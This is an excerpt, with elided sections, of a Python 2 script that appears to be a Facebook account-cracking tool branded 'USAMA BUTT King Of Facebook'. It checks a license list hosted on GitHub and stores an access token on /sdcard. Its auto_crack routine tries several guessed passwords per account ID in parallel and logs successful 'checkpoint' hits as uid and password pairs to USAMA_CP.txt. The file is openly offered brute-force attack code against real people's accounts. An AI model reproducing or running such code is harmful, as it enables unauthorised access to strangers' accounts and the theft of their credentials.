...
\033[1;97m➣ UNITY  : \033[1;97mKSU 
\033[1;97m➣ WP  : \033[1;97m+923124664057
\033[1;94m==============================================="""
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/usamabutt486/KSULEGENDS/main/server.txt').text
    if to in r:
...
def reg2():
    ...
    os.system('xdg-open https://wa.me/+923124664057')
    sav = open('/sdcard/.USAMA.txt', 'w')
    sav.write(id)
    sav.close()
...
def menu():
    ...
    try:
        ...
        print ''
        os.system('rm -rf USAMA_BUTT.txt')
        time.sleep(1)
        log_menu()
    ...
    os.system('clear')
    print logo
    tok = open('/sdcard/.USAMA.txt', 'r').read()
...
def menu_s():
    ...
    if ms == '1':
        ...
        os.system('python2 KSULEGENDS.py')
    elif ms == '3':
        v_tok()
    elif ms == '4':
        lout()
...
def auto_crack():
    ...
    try:
        token = open('USAMA_BUTT.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
...
def a_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;92mUSAMA BUTT King Of Facebook\033[1;94m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                print '\033[1;97m[USAMA-CP] ' + uid + ' | ' + pass1
                cp = open('USAMA_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                if 'loc' in q:
                    ...
                    print '\033[1;97m[USAMA-CP] ' + uid + ' | ' + pass2
                    cp = open('USAMA_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'loc' in q:
                        ...
                        print '\033[1;97m[USAMA-CP] ' + uid + ' | ' + pass3
                        cp = open('USAMA_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'loc' in q:
                            ...
                            print '\033[1;97m[USAMA-CP] ' + uid + ' | ' + pass4
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92m USAMA PROCCESS COMPLETE'
